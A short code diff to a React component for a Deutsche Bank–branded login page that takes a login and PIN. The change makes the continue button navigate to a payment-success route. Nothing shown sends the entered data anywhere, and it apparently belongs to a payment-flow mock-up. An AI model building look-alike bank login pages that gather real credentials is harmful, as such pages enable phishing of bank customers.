@@ -1,5 +1,5 @@
 import { useState } from "react";
-import { createFileRoute, Link } from "@tanstack/react-router";
+import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
 import { ArrowLeft, X } from "lucide-react";
 import { bankLogoUrls } from "@/assets/bank-logos";
 
@@ -24,6 +24,7 @@ function DeutscheBankLoginPage() {
   const [pin, setPin] = useState("");
   const [remember, setRemember] = useState(true);
 
+  const navigate = useNavigate();
   const canContinue = login.trim().length > 0 && pin.trim().length > 0;
 
   return (
@@ -121,6 +122,7 @@ function DeutscheBankLoginPage() {
             <button
               type="button"
               disabled={!canContinue}
+              onClick={() => canContinue && navigate({ to: "/payment-success" })}
               className={`h-14 w-full rounded-full text-[15px] font-semibold transition-colors ${
                 canContinue
                   ? "bg-[#0b051d] text-white hover:bg-[#1a1230]"
